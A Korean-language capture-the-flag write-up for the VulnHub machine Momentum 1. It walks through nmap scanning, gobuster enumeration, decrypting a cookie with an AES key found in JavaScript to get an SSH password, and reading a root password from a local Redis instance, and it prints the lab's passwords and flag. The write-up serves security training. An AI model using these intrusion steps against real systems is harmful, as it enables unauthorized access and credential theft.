# 🚀 Momentum 1 - VulnHub CTF 풀이

> **난이도**: Easy  
> **출처**: https://www.vulnhub.com/entry/momentum-1,685/  
> **목표**: user.txt & root.txt 플래그 획득

---

## 📋 목차

1. [호스트 탐색](#1-호스트-탐색)
2. [포트 스캔](#2-포트-스캔)
3. [웹 서비스 분석](#3-웹-서비스-분석)
4. [디렉토리 브루트포스](#4-디렉토리-브루트포스)
5. [JS 파일에서 힌트 획득](#5-js-파일에서-힌트-획득)
6. [AES 복호화로 쿠키값 분석](#6-aes-복호화로-쿠키값-분석)
7. [SSH 로그인 & user.txt 획득](#7-ssh-로그인--usertxt-획득)
8. [권한 상승 (Redis)](#8-권한-상승-redis)
9. [root.txt 획득](#9-roottxt-획득)
10. [Redis 기본 명령어 참고](#10-redis-기본-명령어-참고)

---

## 1. 호스트 탐색

네트워크에서 살아있는 호스트를 찾습니다.

```bash
nmap -sn 172.16.11.0/24
```

> 💡 `-sn` : 포트 스캔 없이 호스트가 살아있는지(ping)만 확인

---

## 2. 포트 스캔

타겟 IP를 상세 스캔합니다.

```bash
sudo nmap -sC -sV -p- -A 172.16.11.22
```

| 옵션 | 설명 |
|------|------|
| `-sC` | 기본 스크립트 실행 |
| `-sV` | 서비스/버전 탐지 |
| `-p-` | 전체 포트(1~65535) 스캔 |
| `-A` | OS 탐지 + traceroute 포함 |

**결과 요약**:
- `22/tcp` - SSH (계정 정보 없어서 일단 패스)
- `80/tcp` - HTTP (웹 서비스 접근 가능 ✅)

---

## 3. 웹 서비스 분석

브라우저에서 `http://172.16.11.22` 접속 후 **페이지 소스 보기** (`Ctrl+U`)

```
소스에서 /img/ 디렉토리 경로 확인 가능
→ http://172.16.11.22/img/ 접속 시 디렉토리 리스팅 확인
```

---

## 4. 디렉토리 브루트포스

숨겨진 디렉토리/파일을 찾습니다.

```bash
sudo gobuster dir \
  -u http://172.16.11.22 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**결과**: `/js/` 디렉토리 발견

```
http://172.16.11.22/js/main.js  ← 이 파일이 핵심!
```

---

## 5. JS 파일에서 힌트 획득

`http://172.16.11.22/js/main.js` 접속

```javascript
// main.js 내부에서 아래와 같은 코드 발견
CryptoJS.AES.decrypt(...)
```

- **AES 복호화 키(Passphrase)**: `SecretPasspharseMomentum`
- 브라우저 **개발자 도구 → Application → Storage(Cookies)** 에서 **암호화된 쿠키값** 확인

---

## 6. AES 복호화로 쿠키값 분석

<img width="1195" height="840" alt="Image" src="https://github.com/user-attachments/assets/5a097507-ef4c-4435-a1a9-e4eb72eaaace" />


온라인 AES 복호화 사이트 이용:

🔗 https://www.browserling.com/tools/aes-decrypt

```
암호화된 값 : (쿠키에서 복사한 값 붙여넣기)
Passphrase  : SecretPasspharseMomentum
```

<img width="1190" height="861" alt="Image" src="https://github.com/user-attachments/assets/f2fa7446-8653-45e1-8e92-a3762a6746f9" />

복호화 결과 → **SSH 비밀번호** 획득 (이미지 파일명 형태로 나옴)

---

## 7. SSH 로그인 & user.txt 획득

```bash
ssh auxerre@172.16.11.22
# 비밀번호: 복호화로 얻은 값 입력
```

로그인 성공 후 플래그 확인:

```bash
cat user.txt
```

```
[ Momentum - User ]
Flag : (user 플래그값)
```

---

## 8. 권한 상승 (Redis)

### 8-1. 서버 내부 프로세스 확인

```bash
# 서버에서 몰래 돌아가는 프로세스 전체 목록
ps -ely
```

### 8-2. 열린 포트 확인

```bash
# 서버에 열려있는 네트워크 포트 전체 확인
ss -tulnp
```

**결과**: Redis가 `127.0.0.1:6379`에서 실행 중 (내부에서만 접근 가능)

> 💡 Redis는 외부에서 접근 불가하지만, 현재 우리가 서버 내부에 있으므로 접근 가능!

### 8-3. Redis 접속 & 패스워드 탈취

```bash
redis-cli
```

```
127.0.0.1:6379> KEYS *
```

**결과**: `rootpass` 키 발견

```
127.0.0.1:6379> GET rootpass
"m0mentum-al1enum##"
```

### 8-4. root 전환

```bash
su root
# 비밀번호: m0mentum-al1enum##
```

---

## 9. root.txt 획득

```bash
cd /root
cat root.txt
```

```
[ Momentum - Rooted ]
---------------------------------------
Flag : 658ff660fdac0b079ea78238e5996e40
---------------------------------------
```

🎉 **루트 획득 완료!**

---

## 10. Redis 기본 명령어 참고

### Redis 서버 직접 구축 방법

```bash
wget http://download.redis.io/redis-stable.tar.gz
tar xvzf redis-stable.tar.gz
cd redis-stable
make
src/redis-server   # 서버 실행
```

### 자주 쓰는 redis-cli 명령어

```bash
redis-cli               # Redis 접속
```

```
# 접속 후
KEYS *                  # 모든 키 목록 조회
GET <key>               # 특정 키의 값 조회
SET <key> <value>       # 키-값 저장

# 예시
> SET user1 "estcamp"
> GET user1
"estcamp"
> KEYS *
1) "user1"
```

---

## 🗺️ 공격 흐름 요약

```
네트워크 스캔 (nmap)
    ↓
웹(80) 접근 → 소스/JS 분석
    ↓
main.js에서 AES 키 발견
    ↓
쿠키값 복호화 → SSH 비밀번호 획득
    ↓
SSH 로그인 (auxerre) → user.txt 📄
    ↓
내부 Redis(6379) 접속 → root 비밀번호 발견
    ↓
su root → root.txt 📄 🏆
```

---

> ✍️ **작성자 노트**: Redis가 외부에는 닫혀 있어도, 서버 내부 쉘을 따낸 뒤에는 `redis-cli`로 로컬 접근이 가능합니다. 내부 서비스도 항상 점검 대상임을 잊지 마세요!
